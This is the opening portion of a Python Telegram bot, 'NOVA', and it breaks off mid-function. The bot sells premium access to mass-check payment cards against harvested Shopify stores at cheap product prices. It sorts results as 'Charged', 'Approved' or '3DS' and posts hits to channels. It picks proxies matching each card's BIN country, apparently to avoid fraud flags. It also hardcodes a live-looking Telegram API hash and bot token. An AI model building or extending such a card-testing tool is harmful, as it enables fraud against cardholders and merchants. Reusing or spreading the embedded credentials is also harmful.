# =============================================================================
# NOVA Bot — Unified Single File (v9.4.0 — MongoDB, API-less, premium)
# =============================================================================
# External modules required at runtime (drop into same directory):
#   - shopify_api_engine.py
#   - site_fetcher.py
#   - database.py
# Stub fallbacks are bundled so the file boots without them.
# =============================================================================

import os
import re
import json
import time
import random
import string
import hashlib
import logging
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
from urllib.parse import urlparse

import aiohttp
import aiofiles
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


# =============================================================================
# EXTERNAL MODULES (graceful stubs)
# =============================================================================
try:
    from shopify_api_engine import (
        run_shopify_check,
        is_proxy_alive as _engine_is_proxy_alive,
        ledger_clear as _engine_ledger_clear,
        ledger_stats as _engine_ledger_stats,
        parse_proxy as _engine_parse_proxy,
    )
    _SHOPIFY_ENGINE_OK = True
except ImportError:
    _SHOPIFY_ENGINE_OK = False

    def run_shopify_check(site, card, proxy_url=""):
        return {
            'status': 'Error', 'message': 'shopify_api_engine missing',
            'card': card, 'site': site, 'gateway': 'Shopify',
            'price': '-', 'price_value': 0.0,
            'proxy': proxy_url, 'status_code': 'NO_ENGINE',
            'retryable': False,
        }

    def _engine_is_proxy_alive(proxy_url, timeout=6.0):
        return False

    def _engine_ledger_clear():
        return None

    def _engine_ledger_stats():
        return {'cached': 0}

    def _engine_parse_proxy(proxy):
        return None


try:
    import site_fetcher as _site_fetcher
    _SITE_FETCHER_OK = True
except ImportError:
    _SITE_FETCHER_OK = False

    class _StubSiteFetcher:
        def __init__(self):
            self._pool = []
            self._captcha = set()

        def start_harvester(self): return None
        def harvest_once(self, n=200):
            return {'discovered': 0, 'added': 0, 'removed': 0,
                    'pool': len(self._pool), 'captcha': len(self._captcha)}
        def pool_size(self): return len(self._pool)
        def captcha_size(self): return len(self._captcha)
        def snapshot(self):
            return {'count': len(self._pool),
                    'captcha_count': len(self._captcha),
                    'top': list(self._pool)[:50],
                    'min_price': 0.0, 'max_price': 0.0,
                    'harvest_interval': 0,
                    'stats': {'cycles': 0, 'candidates_kept': 0,
                              'candidates_dropped': 0, 'rate_limited': 0}}
        def pick_site(self, exclude=None):
            exclude = exclude or set()
            avail = [s for s in self._pool if s not in exclude]
            return random.choice(avail) if avail else None
        def report_success(self, site): return None
        def report_failure(self, site, weight=1): return None
        def clear_captcha(self, arg=None): return 0

    _site_fetcher = _StubSiteFetcher()


try:
    import database as _db
    _DB_OK = True
except ImportError:
    _DB_OK = False

    class _StubDB:
        """No-op fallback. Persists nothing; every call returns empty/zero."""
        def __init__(self):
            self._memory_users = {}
            self._memory_keys = {}
            self._memory_rank = {}
            self._memory_streaks = {}
            self._memory_history = []
            self._memory_settings = {}
            self._memory_referral_users = {}
            self._memory_referral_codes = {}
            self._memory_proxies = {}
            self._memory_user_limits = {}

        def boot(self):
            return False

        # premium
        def add_premium(self, uid, hours=0, cc_limit=0):
            exp = (datetime.now() + timedelta(hours=hours)).timestamp()
            self._memory_users[int(uid)] = {
                "_id": int(uid), "plan_expiry": exp, "cc_limit": cc_limit,
            }

        def remove_premium(self, uid):
            self._memory_users.pop(int(uid), None)

        def is_premium(self, uid):
            u = self._memory_users.get(int(uid))
            if not u: return False
            exp = u.get("plan_expiry")
            if exp is None: return True
            try:
                return float(exp) > time.time()
            except Exception:
                return True

        def get_cc_limit(self, uid):
            u = self._memory_users.get(int(uid))
            return int(u.get("cc_limit", 0)) if u else 0

        def list_premium(self, limit=100):
            return list(self._memory_users.values())[:limit]

        def purge_expired(self):
            n = 0
            for uid in list(self._memory_users.keys()):
                u = self._memory_users[uid]
                exp = u.get("plan_expiry")
                if exp is not None and float(exp) < time.time():
                    del self._memory_users[uid]
                    n += 1
            return n

        # keys
        def list_keys(self, limit=5000):
            return list(self._memory_keys.values())[:limit]

        def save_key(self, k, v):
            self._memory_keys[k] = dict(v, _id=k)

        def delete_key(self, k):
            self._memory_keys.pop(k, None)

        # rank
        def increment_charged(self, uid):
            self._memory_rank[int(uid)] = self._memory_rank.get(int(uid), 0) + 1

        def get_charged_count(self, uid):
            return self._memory_rank.get(int(uid), 0)

        def rank_all(self):
            return sorted(self._memory_rank.items(), key=lambda x: x[1], reverse=True)

        # settings
        def load_settings(self):
            return dict(self._memory_settings)

        def save_settings(self, s):
            self._memory_settings = dict(s)

        # proxies
        def load_user_proxies(self, uid):
            return list(self._memory_proxies.get(int(uid), []))

        def save_user_proxies(self, uid, proxies):
            self._memory_proxies[int(uid)] = list(proxies)

        # user limits
        def get_user_limit(self, uid):
            return int(self._memory_user_limits.get(int(uid), 0))

        def set_user_limit(self, uid, limit):
            self._memory_user_limits[int(uid)] = int(limit)

        # referrals
        def list_referral_users(self, limit=5000):
            return list(self._memory_referral_users.values())[:limit]

        def list_referral_codes(self, limit=5000):
            return [{"_id": k, "user_id": v}
                    for k, v in self._memory_referral_codes.items()][:limit]

        def get_referral_user(self, uid):
            return self._memory_referral_users.get(int(uid))

        def save_referral_user(self, uid, doc):
            self._memory_referral_users[int(uid)] = dict(doc, _id=int(uid))

        def save_referral_code(self, code, uid):
            self._memory_referral_codes[code] = int(uid)

        def find_referral_by_code(self, code):
            uid = self._memory_referral_codes.get(code)
            return int(uid) if uid is not None else None

        # streaks
        def get_streak(self, uid):
            return self._memory_streaks.get(int(uid))

        def save_streak(self, uid, doc):
            self._memory_streaks[int(uid)] = dict(doc, _id=int(uid))

        # history
        def log_check(self, uid, last4, status, gateway, site, message, price):
            self._memory_history.append({
                "user_id": int(uid), "card_last4": last4, "status": status,
                "gateway": gateway, "site": site, "message": message,
                "price": price, "ts": datetime.now(),
            })

        def history(self, uid, limit=15):
            return [r for r in reversed(self._memory_history)
                    if r["user_id"] == int(uid)][:limit]

        # stats
        def stats(self):
            return {
                "users_total": len(self._memory_users),
                "users_premium": sum(1 for u in self._memory_users.values()
                                     if self.is_premium(u["_id"])),
                "keys_total": len(self._memory_keys),
                "checks_total": len(self._memory_history),
            }

        def _c(self, name):
            return None

    _db = _StubDB()


# =============================================================================
# HEALTH SERVER
# =============================================================================
def _health_server():
    port = int(os.getenv("PORT", "10000"))

    class _H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")

        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    try:
        HTTPServer(("0.0.0.0", port), _H).serve_forever()
    except Exception as e:
        print(f"[health] failed to bind port {port}: {e}")


# =============================================================================
# LOGGING
# =============================================================================
log = logging.getLogger("NOVA")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s',
                          datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_fmt)
log.addHandler(_ch)

if not os.getenv("RAILWAY_ENVIRONMENT"):
    try:
        from logging.handlers import RotatingFileHandler
        _fh = RotatingFileHandler('nova_bot.log', maxBytes=10_000_000,
                                    backupCount=3, encoding='utf-8')
        _fh.setLevel(logging.INFO)
        _fh.setFormatter(_fmt)
        log.addHandler(_fh)
    except Exception:
        pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# =============================================================================
# BOLD SANS
# =============================================================================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper): _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower): _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits): _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


def cmd_chip(cmd: str, style: str = "•") -> str:
    return f"<code>{style} {cmd}</code>"


# =============================================================================
# CONFIG
# =============================================================================
API_ID    = int(os.getenv("API_ID") or 33657928)
API_HASH  = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU")
ADMIN_ID  = [8871910561]

ADMIN_ID_FILE = "admins.json"


def _load_admins():
    global ADMIN_ID
    try:
        if os.path.exists(ADMIN_ID_FILE):
            with open(ADMIN_ID_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                merged = list(dict.fromkeys(
                    list(ADMIN_ID) + [int(x) for x in data if str(x).lstrip('-').isdigit()]
                ))
                ADMIN_ID.clear()
                ADMIN_ID.extend(merged)
    except Exception as e:
        log_system("ADMIN", f"load failed: {e}", "warning")


def _save_admins():
    try:
        with open(ADMIN_ID_FILE, "w", encoding="utf-8") as f:
            json.dump(list(ADMIN_ID), f, indent=2)
    except Exception as e:
        log_system("ADMIN", f"save failed: {e}", "warning")


HIT_CHANNEL_ID          = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
GROUP_CHAT_ID           = -1003902938287
REDEEM_LOG_CHANNEL_ID   = -1003902938287

FORCE_JOIN_GROUP_ID   = -1003902938287
FORCE_JOIN_CHANNEL_ID = -1004381920430

GROUP_INVITE_LINK   = "https://t.me/+_0kBIVQujUEyOTc1"
CHANNEL_INVITE_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"

BOT_BRAND    = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME   = "SUPERGREMLIN"
OWNER_TAG    = "@SUPERGREMLIN01"
DEV_LINE     = f"⌬ {bs('Bot By')} <a href='https://t.me/{OWNER_TAG.lstrip('@')}'>{OWNER_TAG}</a>"

SEP  = "✦━━━━━━━━━━━━✦"
SEP2 = "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"
PE   = "💎"

FREE_DAILY_LIMIT     = 15
FREE_COOLDOWN_SEC    = 10
MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS    = 24
DEFAULT_KEY_CC_LIMIT = 1500

MIN_PRODUCT_PRICE = 0.01
MAX_PRODUCT_PRICE = 7.00

MASS_HARD_CAP_ADMIN   = 10000
MASS_HARD_CAP_PREMIUM = 5000

SITES_FILE = "sites.txt"
RZ_SITES_FILE = "rz_sites.txt"
WELCOME_FILE_ID_FILE = os.environ.get("WELCOME_FILE_ID_FILE", ".welcome_file_id.txt")

REFERRAL_MILESTONE_EVERY    = 5
REFERRAL_MILESTONE_HOURS    = 24
REFERRAL_MILESTONE_CC_LIMIT = 5000
REFERRAL_MIN_CHECKS         = 1
REFERRAL_MAX_PER_USER       = 500

STREAK_MIN_GAP_HOURS = 20
STREAK_MAX_GAP_HOURS = 30
STREAK_MILESTONES = {3: 6, 7: 24, 14: 72, 30: 240}

SP_PER_USER_WORKERS      = 70
MSP_PER_USER_WORKERS     = 70
SITE_PER_USER_WORKERS    = 70
PROXY_PER_USER_WORKERS   = 70
HARVEST_PER_USER_WORKERS = 70

SHOPIFY_SINGLE_TIMEOUT  = 120.0
SHOPIFY_MASS_TIMEOUT    = 120.0


# =============================================================================
# PREMIUM EMOJI
# =============================================================================
PREMIUM_EMOJI_IDS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","⚠️":"5420323339723881652",
    "⚡":"6174996123522959140","🔥":"5039644681583985437","💎":"5427168083074628963",
    "✔️":"5206607081334906820","✨":"5040016479722931047","🎉":"5039778134807806727",
    "🎯":"5039905162760553480","⛔":"6181277564732972292","🛑":"6181277564732972292",
    "🚨":"5039671744172917707","💰":"5039789890133296083","💳":"5447453226498552490",
    "💲":"5447579253723918909","💵":"5409048419211682843","💸":"5837027045376271166",
    "🏦":"6089185885289454318","🏧":"5447453226498552490","📊":"5042290883949495533",
    "📈":"5039808285478224750","📉":"5039759318556083411","🥇":"6179279816529814743",
    "🥈":"5042036407137207122","🥉":"5039808285478224750","🥔":"5039928501612839813",
    "🧨":"5039778134807806727","🏆":"6089185885289454318","👑":"5039727497143387500",
    "👤":"5992129361090711368","🤖":"6174896506051495705","⚙️":"5445059250382469069",
    "🌐":"6321225560789877992","ℹ️":"5334544901428229844","🏳️":"5256143829672672750",
    "📍":"5391032818111363540","📡":"5447448489149625830","🔔":"5042111805288089118",
    "🛡":"5042328396193864923","🛡️":"5042328396193864923","🔑":"5399885604701880145",
    "🔒":"5445059250382469069","🔓":"5445373981290952548","🔗":"5042101437237036298",
    "🔐":"5445059250382469069","⏰":"5445350406215465190","⏱️":"5445350406215465190",
    "⏱":"5445350406215465190","⌛":"5445350406215465190","🚀":"6174445826543191998",
    "⭐":"5042061201983407048","💫":"5042200814190330758","🔮":"5042302287087666158",
    "💠":"5427168083074628963","🌍":"5447410659077661506","🔰":"5042328396193864923",
    "📧":"5443127283898405358","💀":"5042209657527993345","💯":"5042297717242463211",
    "🚫":"5039671744172917707","😈":"6336664426325740768","📝":"5444889156792646660",
    "📁":"6026239398650056451","🗑":"5039614900280754969","📅":"6168242008277125889",
    "📤":"5445355530111437729","📥":"5443127283898405358","🟢":"5039928501612839813",
    "🔴":"5042042652019655612","🟡":"5042036407137207122","🔵":"5042290883949495533",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⏸":"5042036407137207122","▶️":"5039753786638205957","⏹":"5134537521518085000",
    "🧹":"5039751080808809534","📌":"5397782960512444700","📋":"5445260044398524944",
    "🔧":"5445059250382469069","🔍":"5042302287087666158","💻":"5039579582764680065",
    "📩":"5443127283898405358","💬":"5040036030414062506","📢":"5447644880824181073",
    "📣":"5447644880824181073","💡":"5042264341051605743","🛒":"5445224894386172410",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏠":"5416041192905265756",
    "🏙️":"5447410659077661506","📞":"5443127283898405358","📮":"5444889156792646660",
    "🗺️":"6321225560789877992","↪️":"5445365692004071819","🔙":"5445365692004071819",
    "⬅️":"5445365692004071819","➡️":"5445365692004071819","🎀":"5039953030171067177",
    "🎊":"5039778134807806727","🌟":"5042061201983407048","🔀":"5348386034835015762",
    "🎬":"5445355530111437729","🧠":"6174896506051495705","🖥️":"5039579582764680065",
    "💾":"6026239398650056451","💿":"6026239398650056451","🏓":"5042200814190330758",
    "🎁":"5039778134807806727","🎈":"5039778134807806727","🎨":"5039953030171067177",
    "🌸":"5039953030171067177","🍀":"5039928501612839813","🌙":"5042200814190330758",
    "☀️":"5039808285478224750","🌈":"5256143829672672750","👥":"5443038326535759644",
}


def pe(text):
    if not text:
        return text
    out = text
    for emoji in sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True):
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        out = out.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return out


# =============================================================================
# CLIENT + MESSAGE HELPERS
# =============================================================================
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception:
            return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities,
                                         buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except Exception:
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities,
                                        buttons=buttons, link_preview=False), timeout=8)
    except Exception:
        pass


async def send_entities(chat_id, html_text, buttons=None, file=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        return await client_instance.send_message(
            chat_id, text, formatting_entities=ents,
            buttons=buttons, link_preview=False, **kwargs)
    except Exception as e:
        log_system("SEND", f"send_entities failed: {e}", "error")
        return None


async def send_file_entities(chat_id, file, html_caption, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_caption)
        return await client_instance.send_file(
            chat_id, file, caption=text, formatting_entities=ents,
            buttons=buttons, **kwargs)
    except Exception as e:
        log_system("SEND_FILE", f"send_file_entities failed: {e}", "error")
        return None


async def edit_entities(msg, html_text, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        await msg.edit(text, formatting_entities=ents,
                       buttons=buttons, link_preview=False, **kwargs)
        return True
    except Exception:
        return False


# =============================================================================
# BUTTON HELPER
# =============================================================================
BUTTON_ICONS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","↪️":"5445365692004071819",
    "🔥":"5039644681583985437","⚡":"6174996123522959140","⭐":"5042061201983407048",
    "🚀":"6174445826543191998","⚙️":"5445059250382469069","📡":"5447448489149625830",
    "💫":"5042200814190330758","💎":"5427168083074628963","🌐":"6321225560789877992",
    "⚠️":"5420323339723881652","🛡️":"5042328396193864923","💰":"5039789890133296083",
    "👑":"5039727497143387500","🤖":"6174896506051495705","📋":"5445260044398524944",
    "💳":"5447453226498552490","⏰":"5445350406215465190","💻":"5039579582764680065",
    "🔑":"5399885604701880145","🔓":"5445373981290952548","🔌":"6321225560789877992",
    "🛠️":"5445059250382469069","🔙":"5445365692004071819","🛒":"5445224894386172410",
    "🔴":"5042042652019655612","📁":"6026239398650056451","📥":"5443127283898405358",
    "📢":"5447644880824181073","👥":"5443038326535759644","📩":"5443127283898405358",
    "💬":"5040036030414062506","🥇":"6179279816529814743","🥈":"5042036407137207122",
    "🥉":"5039808285478224750","🥔":"5039928501612839813","🧨":"5039778134807806727",
    "🟢":"5039928501612839813","🔵":"5042290883949495533","🟡":"5042036407137207122",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⛔":"6181277564732972292","🛑":"6181277564732972292","🚨":"5039671744172917707",
    "🎯":"5039905162760553480","📊":"5042290883949495533","📈":"5039808285478224750",
    "🏆":"6089185885289454318","👤":"5992129361090711368","📌":"5397782960512444700",
    "🔍":"5042302287087666158","🔧":"5445059250382469069","💡":"5042264341051605743",
    "📝":"5444889156792646660","🗑":"5039614900280754969","📅":"6168242008277125889",
    "🧹":"5039751080808809534","🎉":"5039778134807806727","✨":"5040016479722931047",
    "✔️":"5206607081334906820","🔒":"5445059250382469069","🔐":"5445059250382469069",
    "🌍":"5447410659077661506","📍":"5391032818111363540","🎬":"5445355530111437729",
    "🎀":"5039953030171067177","🎊":"5039778134807806727","🌟":"5042061201983407048",
    "💯":"5042297717242463211","😈":"6336664426325740768","💀":"5042209657527993345",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏦":"6089185885289454318",
    "💵":"5409048419211682843","💸":"5837027045376271166","💲":"5447579253723918909",
    "⏱️":"5445350406215465190","⏱":"5445350406215465190","⌛":"5445350406215465190",
    "📤":"5445355530111437729","🔗":"5042101437237036298","💠":"5427168083074628963",
    "🔮":"5042302287087666158","🔀":"5348386034835015762",
}


def pbtn(text, data=None, url=None, style=None, icon=None):
    icon_id = None
    if icon:
        icon_id = BUTTON_ICONS.get(icon)
        if icon_id:
            icon_id = int(icon_id)
    if icon_id is None and text:
        for e, i in BUTTON_ICONS.items():
            if e in text:
                icon_id = int(i)
                break
    clean = text
    if icon and icon in clean:
        clean = clean.replace(icon, '').strip()
    if url:
        try:
            return Button.url(clean, url, style=style)
        except Exception:
            return Button.url(clean, url)
    if data:
        try:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data,
                                 icon=icon_id, style=style)
        except Exception:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data)
    try:
        return Button.inline(clean, b"none", icon=icon_id, style=style)
    except Exception:
        return Button.inline(clean, b"none")


# =============================================================================
# PREMIUM USERS (DB-backed)
# =============================================================================
def load_premium_users() -> dict:
    out = {}
    for d in _db.list_premium(5000):
        try:
            uid = str(d["_id"])
            out[uid] = {"expiry": d.get("plan_expiry"),
                        "cc_limit": d.get("cc_limit")}
        except Exception:
            continue
    return out


def save_premium_users(data: dict):
    if not isinstance(data, dict):
        return
    existing = set()
    try:
        for d in _db.list_premium(10000):
            try:
                existing.add(int(d["_id"]))
            except Exception:
                pass
    except Exception:
        pass
    for uid_str, info in data.items():
        try:
            uid = int(uid_str)
        except Exception:
            continue
        if info is None:
            _db.add_premium(uid, hours=24 * 365 * 100, cc_limit=100000)
            existing.discard(uid)
        elif isinstance(info, dict):
            exp = info.get("expiry")
            cc = int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT) or DEFAULT_KEY_CC_LIMIT)
            hours = 24 * 30
            if exp:
                try:
                    hours = max(1, int((float(exp) - time.time()) / 3600))
                except Exception:
                    pass
            _db.add_premium(uid, hours=hours, cc_limit=cc)
            existing.discard(uid)
    for uid in existing:
        try:
            _db.remove_premium(uid)
        except Exception:
            pass


def is_premium(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    return _db.is_premium(user_id)


def add_premium(user_id: int, expiry_ts=None, cc_limit=None):
    hours = 24 * 30
    if expiry_ts:
        try:
            hours = max(1, int((float(expiry_ts) - time.time()) / 3600))
        except Exception:
            pass
    _db.add_premium(user_id, hours=hours, cc_limit=cc_limit or DEFAULT_KEY_CC_LIMIT)


def remove_premium(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return False
    _db.remove_premium(user_id)
    return True


def get_cc_limit(user_id: int) -> int:
    if user_id in ADMIN_ID:
        return 100000
    return _db.get_cc_limit(user_id)


# =============================================================================
# PROXIES (DB-backed)
# =============================================================================
def load_user_proxies(user_id: int) -> list:
    return _db.load_user_proxies(user_id)


def save_user_proxies(user_id: int, proxies: list):
    _db.save_user_proxies(user_id, proxies)


# =============================================================================
# SITES
# =============================================================================
def load_sites() -> list:
    try:
        snap = _site_fetcher.snapshot()
        top = snap.get("top") or []
        if top:
            return top
    except Exception:
        pass
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_sites(sites: list):
    try:
        with open(SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save sites failed: {e}", "error")


def load_rz_sites() -> list:
    if not os.path.exists(RZ_SITES_FILE):
        return []
    try:
        with open(RZ_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_rz_sites(sites: list):
    try:
        with open(RZ_SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save rz sites failed: {e}", "error")


def get_welcome_file_id():
    if os.path.exists(WELCOME_FILE_ID_FILE):
        try:
            with open(WELCOME_FILE_ID_FILE, "r", encoding="utf-8") as f:
                fid = f.read().strip()
                return fid or None
        except Exception:
            pass
    return None


def set_welcome_file_id(fid: str):
    try:
        with open(WELCOME_FILE_ID_FILE, "w", encoding="utf-8") as f:
            f.write(fid)
    except Exception:
        pass


# =============================================================================
# SITE STATS BRIDGE
# =============================================================================
def _site_report(site: str, status: str):
    if not site:
        return
    try:
        if status in ("Charged", "Approved", "3DS"):
            _site_fetcher.report_success(site)
        elif status == "Error":
            _site_fetcher.report_failure(site, weight=1)
    except Exception as e:
        log_system("SITE_STATS", f"report {site}: {e}", "error")


def _get_active_sites(all_sites: list) -> list:
    if not all_sites:
        return []
    lst = list(all_sites)
    random.shuffle(lst)
    return lst


# =============================================================================
# SMART PROXY ROTATION
# =============================================================================
_BIN_COUNTRY_CACHE = {}

_COUNTRY_CODES = {
    'US','CA','MX','BR','AR','CL','CO','PE','VE','EC','UY','PY','BO',
    'GB','IE','DE','FR','IT','ES','PT','NL','BE','CH','AT','SE','NO',
    'DK','FI','PL','CZ','HU','RO','GR','RU','UA','TR',
    'AE','SA','QA','KW','BH','OM','JO','LB','IL','EG','MA','DZ','TN',
    'ZA','NG','KE',
    'IN','PK','BD','LK','NP','CN','HK','TW','JP','KR','TH','VN','PH',
    'MY','SG','ID',
    'AU','NZ','FJ',
}

_PROXY_COUNTRY_NEIGHBOURS = {
    'US': ['CA', 'MX'], 'CA': ['US'],
    'GB': ['IE', 'FR', 'DE', 'NL'], 'IE': ['GB'],
    'DE': ['AT', 'CH', 'NL', 'FR', 'PL', 'CZ'], 'AT': ['DE', 'CH'],
    'CH': ['DE', 'FR', 'IT', 'AT'], 'FR': ['BE', 'DE', 'IT', 'ES', 'CH'],
    'IT': ['FR', 'DE', 'CH', 'AT'], 'ES': ['FR', 'PT', 'IT'], 'PT': ['ES'],
    'NL': ['BE', 'DE', 'GB'], 'BE': ['NL', 'FR', 'DE'],
    'AU': ['NZ'], 'NZ': ['AU'],
    'IN': ['PK', 'LK', 'BD'], 'AE': ['SA', 'QA', 'KW', 'BH', 'OM'],
    'SA': ['AE', 'QA', 'KW', 'BH', 'OM'], 'BR': ['AR', 'CL', 'CO'],
    'MX': ['US'], 'RU': ['UA'], 'UA': ['RU'], 'CN': ['HK', 'TW'],
    'HK': ['CN', 'TW'], 'JP': ['KR'], 'KR': ['JP'],
    'TH': ['VN', 'MY', 'SG'], 'VN': ['TH', 'MY', 'SG'],
    'MY': ['SG', 'TH', 'ID'], 'SG': ['MY', 'ID'], 'ID': ['MY', 'SG'],
}


async def _get_bin_country(bin_prefix: str) -> str:
    bin6 = (bin_prefix or '')[:6]
    if not bin6 or len(bin6) < 6 or not bin6.isdigit():
        return ""
    if bin6 in _BIN_COUNTRY_CACHE:
        return _BIN_COUNTRY_CACHE[bin6]
    try:
        session = await get_bin_session()
        async with session.get(
            f"https://bins.antipublic.cc/bins/{bin6}",
            timeout=aiohttp.ClientTimeout(total=6),
        ) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                cc = (data.get("country_code") or "").upper()
                _BIN_COUNTRY_CACHE[bin6] = cc
                return cc
    except Exception:
        pass
    _BIN_COUNTRY_CACHE[bin6] = ""
    return ""


def _parse_proxy_country(proxy_line: str) -> str:
    if not proxy_line:
        return ""
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    m = re.search(r'[|#]([A-Z]{2})$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    return ""


def _strip_country_from_proxy(proxy_line: str) -> str:
    if not proxy_line:
        return proxy_line
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(2)
    m = re.search(r'^(.+?)[|#]([A-Z]{2})$', p)
    if m and m.group(2) in _COUNTRY_CODES:
        return m.group(1)
    return p


async def _pick_smart_proxy(card: str, proxies: list):
    if not proxies:
        return None
    bin_country = await _get_bin_country(card.split('|')[0][:6])
    if not bin_country:
        return None
    tagged = {}
    for pr in proxies:
        cc = _parse_proxy_country(pr)
        if cc:
            tagged.setdefault(cc, []).append(pr)
    if not tagged:
        return None
    if bin_country in tagged:
        return random.choice(tagged[bin_country])
    for nb in _PROXY_COUNTRY_NEIGHBOURS.get(bin_country, []):
        if nb in tagged:
            return random.choice(tagged[nb])
    return None


# =============================================================================
# KEYS (DB-backed)
# =============================================================================
def load_keys() -> dict:
    out = {}
    for d in _db.list_keys(5000):
        try:
            k = d.pop("_id")
            out[k] = d
        except Exception:
            continue
    return out


def save_keys(keys: dict):
    if not isinstance(keys, dict):
        return
    existing = set()
    try:
        for d in _db.list_keys(10000):
            existing.add(d["_id"])
    except Exception:
        pass
    for k, v in keys.items():
        try:
            _db.save_key(k, dict(v))
            existing.discard(k)
        except Exception:
            continue
    for k in existing:
        try:
            _db.delete_key(k)
        except Exception:
            pass


def generate_key() -> str:
    part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
    return f"NOVA_{part}"


# =============================================================================
# RANK (DB-backed)
# =============================================================================
def load_rank() -> dict:
    return {str(uid): int(cnt) for uid, cnt in _db.rank_all()}


def save_rank(data: dict):
    pass


def increment_charge_count(user_id: int):
